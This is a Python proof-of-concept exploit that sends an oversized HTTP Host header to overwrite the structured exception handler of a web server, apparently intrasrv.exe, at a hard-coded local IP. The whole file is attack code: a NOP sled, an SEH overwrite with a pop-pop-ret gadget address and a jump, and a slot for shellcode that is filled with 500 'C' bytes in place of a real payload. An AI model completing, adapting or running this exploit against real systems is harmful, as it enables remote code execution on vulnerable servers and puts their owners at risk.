#!/usr/bin/python

import socket
import os
import sys

target="192.168.1.169"

nseh="\xEB\x80\x90\x90"#jmp back do egghunter

seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe

crash = "\x90"*1549 + nseh + seh + "B"*500

shellcode = "C"*500

buffer="GET / HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
one.connect((target, 80))
one.send(buffer)
one.close()